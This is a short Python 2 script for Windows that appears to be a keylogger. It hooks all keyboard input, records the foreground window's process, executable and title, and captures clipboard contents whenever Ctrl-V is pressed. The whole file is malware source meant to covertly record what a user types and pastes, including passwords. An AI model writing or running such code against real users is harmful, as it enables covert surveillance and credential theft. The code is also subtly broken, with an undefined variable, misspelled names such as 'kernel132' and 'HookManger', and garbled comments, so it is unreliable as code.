from ctypes import *
import pythoncom 
import pyHook
import win32clipboard

user32      = windll.user32
kernel32    = windll.kernel32
psapi       = windll.psapi
current_window  = None

def get_current_process():

    #get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    #find the process Id
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    #store the currrent Process Id
    process_id = "%d" % pid.value

    #grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    #now read its title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd,byref(window_title),512)

    # print out the header if we are in the right processor 
    print 
    print "[PID : %s - %s - %s ]" % (process_id, executable.value,title.value)
    print

    #close handledfdf
    kernel32.CloseHandle(hwnd)
    kernel132.CloseHandle(h_process)

def KeyStroke(event):
    
    global current_window

    #check to see if target changed windows 
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # if they pressed a standard key 
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii)
    else:
        #if [ctrl-v], get the value on the clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[Paste] - %s" % (pasted_value),
        else:
            print "[%s]" % event.Key,

    #pass execution to next book registered
    return True

#create and register a hook Manager
kl      = pyHook.HookManger()
kl.KeyDown = KeyStroke

# register the hook and exceute forever
kl.HookKeyboard()
pythoncom.PumpMessages()
